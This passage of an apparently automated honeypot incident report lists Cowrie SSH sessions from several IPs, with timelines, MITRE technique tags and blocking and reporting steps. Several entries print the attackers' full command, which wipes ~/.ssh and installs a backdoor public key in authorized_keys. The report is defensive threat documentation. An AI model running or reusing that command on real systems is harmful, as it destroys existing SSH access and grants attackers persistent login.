| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:11:24` | `cowrie.session.connect` |
| `2026-09-08 04:11:24` | `cowrie.client.version` |
| `2026-09-08 04:11:24` | `cowrie.client.kex` |
| `2026-09-08 04:11:25` | `cowrie.login.success` |
| `2026-09-08 04:11:26` | `cowrie.session.params` |
| `2026-09-08 04:11:26` | `cowrie.command.input` |
| `2026-09-08 04:11:26` | `cowrie.command.failed` |
| `2026-09-08 04:11:26` | `cowrie.log.closed` |
| `2026-09-08 04:11:27` | `cowrie.session.params` |
| `2026-09-08 04:11:27` | `cowrie.command.input` |
| `2026-09-08 04:11:27` | `cowrie.session.file_download` |
| `2026-09-08 04:11:27` | `cowrie.log.closed` |
| `2026-09-08 04:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]205` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed6babe6732f

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]205` |
| **First Seen** | 2026-09-08 04:11 |
| **Last Seen** | 2026-09-08 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:11:28` | `cowrie.session.connect` |
| `2026-09-08 04:11:28` | `cowrie.client.version` |
| `2026-09-08 04:11:28` | `cowrie.client.kex` |
| `2026-09-08 04:11:29` | `cowrie.login.success` |
| `2026-09-08 04:11:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]205` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]205` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ca89e22d8cf

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]205` |
| **First Seen** | 2026-09-08 04:11 |
| **Last Seen** | 2026-09-08 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:11:29` | `cowrie.session.connect` |
| `2026-09-08 04:11:29` | `cowrie.client.version` |
| `2026-09-08 04:11:29` | `cowrie.client.kex` |
| `2026-09-08 04:11:30` | `cowrie.login.success` |
| `2026-09-08 04:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]205` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]205` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8184b0ef9a1

| Field | Detail |
|---|---|
| **Source IP** | `117.50.73[.]90` |
| **First Seen** | 2026-09-08 04:12 |
| **Last Seen** | 2026-09-08 04:17 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:12:08` | `cowrie.session.connect` |
| `2026-09-08 04:12:08` | `cowrie.client.version` |
| `2026-09-08 04:12:09` | `cowrie.client.kex` |
| `2026-09-08 04:12:10` | `cowrie.login.success` |
| `2026-09-08 04:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.73[.]90` to AbuseIPDB if not already reported
- [ ] Block `117.50.73[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f03a779f32b9

| Field | Detail |
|---|---|
| **Source IP** | `206.42.8[.]243` |
| **First Seen** | 2026-09-08 04:13 |
| **Last Seen** | 2026-09-08 04:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:13:29` | `cowrie.session.connect` |
| `2026-09-08 04:13:29` | `cowrie.client.version` |
| `2026-09-08 04:13:29` | `cowrie.client.kex` |
| `2026-09-08 04:13:29` | `cowrie.login.success` |
| `2026-09-08 04:13:30` | `cowrie.session.params` |
| `2026-09-08 04:13:30` | `cowrie.command.input` |
| `2026-09-08 04:13:30` | `cowrie.command.failed` |
| `2026-09-08 04:13:30` | `cowrie.log.closed` |
| `2026-09-08 04:13:31` | `cowrie.session.params` |
| `2026-09-08 04:13:31` | `cowrie.command.input` |
| `2026-09-08 04:13:31` | `cowrie.session.file_download` |
| `2026-09-08 04:13:31` | `cowrie.log.closed` |
| `2026-09-08 04:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.8[.]243` to AbuseIPDB if not already reported
- [ ] Block `206.42.8[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c201f72fa41e

| Field | Detail |
|---|---|
| **Source IP** | `206.42.8[.]243` |
| **First Seen** | 2026-09-08 04:13 |
| **Last Seen** | 2026-09-08 04:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:13:31` | `cowrie.session.connect` |
| `2026-09-08 04:13:31` | `cowrie.client.version` |
| `2026-09-08 04:13:31` | `cowrie.client.kex` |
| `2026-09-08 04:13:31` | `cowrie.login.success` |
| `2026-09-08 04:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.8[.]243` to AbuseIPDB if not already reported
- [ ] Block `206.42.8[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ee33b07ea1d

| Field | Detail |
|---|---|
| **Source IP** | `206.42.8[.]243` |
| **First Seen** | 2026-09-08 04:13 |
| **Last Seen** | 2026-09-08 04:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:13:32` | `cowrie.session.connect` |
| `2026-09-08 04:13:32` | `cowrie.client.version` |
| `2026-09-08 04:13:32` | `cowrie.client.kex` |
| `2026-09-08 04:13:32` | `cowrie.login.success` |
| `2026-09-08 04:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.8[.]243` to AbuseIPDB if not already reported
- [ ] Block `206.42.8[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-229ca46551ae

| Field | Detail |
|---|---|
| **Source IP** | `61.43.121[.]132` |
| **First Seen** | 2026-09-08 04:15 |
| **Last Seen** | 2026-09-08 04:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:15:09` | `cowrie.session.connect` |
| `2026-09-08 04:15:09` | `cowrie.client.version` |
| `2026-09-08 04:15:09` | `cowrie.client.kex` |
| `2026-09-08 04:15:10` | `cowrie.login.success` |
| `2026-09-08 04:15:11` | `cowrie.session.params` |
| `2026-09-08 04:15:11` | `cowrie.command.input` |
| `2026-09-08 04:15:11` | `cowrie.command.failed` |
| `2026-09-08 04:15:11` | `cowrie.log.closed` |
| `2026-09-08 04:15:12` | `cowrie.session.params` |
| `2026-09-08 04:15:12` | `cowrie.command.input` |
| `2026-09-08 04:15:12` | `cowrie.session.file_download` |
| `2026-09-08 04:15:12` | `cowrie.log.closed` |
| `2026-09-08 04:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.43.121[.]132` to AbuseIPDB if not already reported
- [ ] Block `61.43.121[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9c23ebceca2

| Field | Detail |
|---|---|
| **Source IP** | `168.76.131[.]178` |
| **First Seen** | 2026-09-08 04:15 |
| **Last Seen** | 2026-09-08 04:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:15:12` | `cowrie.session.connect` |
| `2026-09-08 04:15:12` | `cowrie.client.version` |
| `2026-09-08 04:15:12` | `cowrie.client.kex` |
| `2026-09-08 04:15:13` | `cowrie.login.success` |
| `2026-09-08 04:15:14` | `cowrie.session.params` |
| `2026-09-08 04:15:14` | `cowrie.command.input` |
| `2026-09-08 04:15:14` | `cowrie.command.failed` |
| `2026-09-08 04:15:14` | `cowrie.log.closed` |
| `2026-09-08 04:15:15` | `cowrie.session.params` |
| `2026-09-08 04:15:15` | `cowrie.command.input` |
| `2026-09-08 04:15:15` | `cowrie.session.file_download` |
| `2026-09-08 04:15:15` | `cowrie.log.closed` |
| `2026-09-08 04:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.76.131[.]178` to AbuseIPDB if not already reported
- [ ] Block `168.76.131[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00dd391fc94f

| Field | Detail |
|---|---|
| **Source IP** | `61.43.121[.]132` |
| **First Seen** | 2026-09-08 04:15 |
| **Last Seen** | 2026-09-08 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:15:13` | `cowrie.session.connect` |
| `2026-09-08 04:15:13` | `cowrie.client.version` |
| `2026-09-08 04:15:13` | `cowrie.client.kex` |
| `2026-09-08 04:15:14` | `cowrie.login.success` |
| `2026-09-08 04:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.43.121[.]132` to AbuseIPDB if not already reported
- [ ] Block `61.43.121[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57a57b9d914f

| Field | Detail |
|---|---|
| **Source IP** | `61.43.121[.]132` |
| **First Seen** | 2026-09-08 04:15 |
| **Last Seen** | 2026-09-08 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:15:14` | `cowrie.session.connect` |
| `2026-09-08 04:15:14` | `cowrie.client.version` |
| `2026-09-08 04:15:15` | `cowrie.client.kex` |
| `2026-09-08 04:15:16` | `cowrie.login.success` |
| `2026-09-08 04:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.43.121[.]132` to AbuseIPDB if not already reported
- [ ] Block `61.43.121[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c23a25fb7fd6

| Field | Detail |
|---|---|
| **Source IP** | `168.76.131[.]178` |
| **First Seen** | 2026-09-08 04:15 |
| **Last Seen** | 2026-09-08 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:15:16` | `cowrie.session.connect` |
| `2026-09-08 04:15:16` | `cowrie.client.version` |
| `2026-09-08 04:15:16` | `cowrie.client.kex` |
| `2026-09-08 04:15:17` | `cowrie.login.success` |
| `2026-09-08 04:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.76.131[.]178` to AbuseIPDB if not already reported
- [ ] Block `168.76.131[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcb17f76b462

| Field | Detail |
|---|---|
| **Source IP** | `168.76.131[.]178` |
| **First Seen** | 2026-09-08 04:15 |
| **Last Seen** | 2026-09-08 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:15:17` | `cowrie.session.connect` |
| `2026-09-08 04:15:17` | `cowrie.client.version` |
| `2026-09-08 04:15:17` | `cowrie.client.kex` |
| `2026-09-08 04:15:18` | `cowrie.login.success` |
| `2026-09-08 04:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.76.131[.]178` to AbuseIPDB if not already reported
- [ ] Block `168.76.131[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba6c444c235b

| Field | Detail |
|---|---|
| **Source IP** | `34.52.182[.]122` |
| **First Seen** | 2026-09-08 04:16 |
| **Last Seen** | 2026-09-08 04:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:16:15` | `cowrie.session.connect` |
| `2026-09-08 04:16:15` | `cowrie.login.success` |
| `2026-09-08 04:16:16` | `cowrie.session.params` |
| `2026-09-08 04:16:16` | `cowrie.command.input` |
| `2026-09-08 04:16:16` | `cowrie.command.input` |
| `2026-09-08 04:16:16` | `cowrie.command.failed` |
| `2026-09-08 04:16:16` | `cowrie.command.input` |
| `2026-09-08 04:16:16` | `cowrie.log.closed` |
| `2026-09-08 04:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.52.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `34.52.182[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fef0f6948450

| Field | Detail |
|---|---|
| **Source IP** | `47.82.78[.]112` |
| **First Seen** | 2026-09-08 04:16 |
| **Last Seen** | 2026-09-08 04:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:16:18` | `cowrie.session.connect` |
| `2026-09-08 04:16:18` | `cowrie.client.version` |
| `2026-09-08 04:16:18` | `cowrie.client.kex` |
| `2026-09-08 04:16:19` | `cowrie.login.success` |
| `2026-09-08 04:16:20` | `cowrie.session.params` |
| `2026-09-08 04:16:20` | `cowrie.command.input` |
| `2026-09-08 04:16:20` | `cowrie.command.failed` |
| `2026-09-08 04:16:20` | `cowrie.log.closed` |
| `2026-09-08 04:16:22` | `cowrie.session.params` |
| `2026-09-08 04:16:22` | `cowrie.command.input` |
| `2026-09-08 04:16:22` | `cowrie.session.file_download` |
| `2026-09-08 04:16:22` | `cowrie.log.closed` |
| `2026-09-08 04:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.82.78[.]112` to AbuseIPDB if not already reported
- [ ] Block `47.82.78[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c46bf99fb4e9

| Field | Detail |
|---|---|
| **Source IP** | `47.82.78[.]112` |
| **First Seen** | 2026-09-08 04:16 |
| **Last Seen** | 2026-09-08 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:16:22` | `cowrie.session.connect` |
| `2026-09-08 04:16:22` | `cowrie.client.version` |
| `2026-09-08 04:16:22` | `cowrie.client.kex` |
| `2026-09-08 04:16:23` | `cowrie.login.success` |
| `2026-09-08 04:16:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.82.78[.]112` to AbuseIPDB if not already reported
- [ ] Block `47.82.78[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf11a6df685

| Field | Detail |
|---|---|
| **Source IP** | `47.82.78[.]112` |
| **First Seen** | 2026-09-08 04:16 |
| **Last Seen** | 2026-09-08 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:16:23` | `cowrie.session.connect` |
| `2026-09-08 04:16:24` | `cowrie.client.version` |
| `2026-09-08 04:16:24` | `cowrie.client.kex` |
| `2026-09-08 04:16:25` | `cowrie.login.success` |
| `2026-09-08 04:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.82.78[.]112` to AbuseIPDB if not already reported
- [ ] Block `47.82.78[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-445010e90996

| Field | Detail |
|---|---|
| **Source IP** | `34.52.182[.]122` |
| **First Seen** | 2026-09-08 04:16 |
| **Last Seen** | 2026-09-08 04:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:16:24` | `cowrie.session.connect` |
| `2026-09-08 04:16:24` | `cowrie.login.success` |
| `2026-09-08 04:16:25` | `cowrie.session.params` |
| `2026-09-08 04:16:25` | `cowrie.command.input` |
| `2026-09-08 04:16:25` | `cowrie.command.failed` |
| `2026-09-08 04:16:27` | `cowrie.log.closed` |
| `2026-09-08 04:16:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.52.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `34.52.182[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b1d46917186

| Field | Detail |
|---|---|
| **Source IP** | `34.52.182[.]122` |
| **First Seen** | 2026-09-08 04:16 |
| **Last Seen** | 2026-09-08 04:16 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:16:26` | `cowrie.session.connect` |
| `2026-09-08 04:16:26` | `cowrie.login.success` |
| `2026-09-08 04:16:27` | `cowrie.session.params` |
| `2026-09-08 04:16:27` | `cowrie.command.input` |
| `2026-09-08 04:16:39` | `cowrie.log.closed` |
| `2026-09-08 04:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.52.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `34.52.182[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19efa57a21fe

| Field | Detail |
|---|---|
| **Source IP** | `47.238.108[.]95` |
| **First Seen** | 2026-09-08 04:18 |
| **Last Seen** | 2026-09-08 04:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:18:25` | `cowrie.session.connect` |
| `2026-09-08 04:18:25` | `cowrie.client.version` |
| `2026-09-08 04:18:26` | `cowrie.client.kex` |
| `2026-09-08 04:18:27` | `cowrie.login.success` |
| `2026-09-08 04:18:28` | `cowrie.session.params` |
| `2026-09-08 04:18:28` | `cowrie.command.input` |
| `2026-09-08 04:18:28` | `cowrie.command.failed` |
| `2026-09-08 04:18:28` | `cowrie.log.closed` |
| `2026-09-08 04:18:29` | `cowrie.session.params` |
| `2026-09-08 04:18:29` | `cowrie.command.input` |
| `2026-09-08 04:18:29` | `cowrie.session.file_download` |
| `2026-09-08 04:18:29` | `cowrie.log.closed` |
| `2026-09-08 04:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.108[.]95` to AbuseIPDB if not already reported
- [ ] Block `47.238.108[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6175aa3e567

| Field | Detail |
|---|---|
| **Source IP** | `47.238.108[.]95` |
| **First Seen** | 2026-09-08 04:18 |
| **Last Seen** | 2026-09-08 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:18:29` | `cowrie.session.connect` |
| `2026-09-08 04:18:29` | `cowrie.client.version` |
| `2026-09-08 04:18:30` | `cowrie.client.kex` |
| `2026-09-08 04:18:30` | `cowrie.login.success` |
| `2026-09-08 04:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.108[.]95` to AbuseIPDB if not already reported
- [ ] Block `47.238.108[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dfd73259d6c

| Field | Detail |
|---|---|
| **Source IP** | `47.238.108[.]95` |
| **First Seen** | 2026-09-08 04:18 |
| **Last Seen** | 2026-09-08 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:18:31` | `cowrie.session.connect` |
| `2026-09-08 04:18:31` | `cowrie.client.version` |
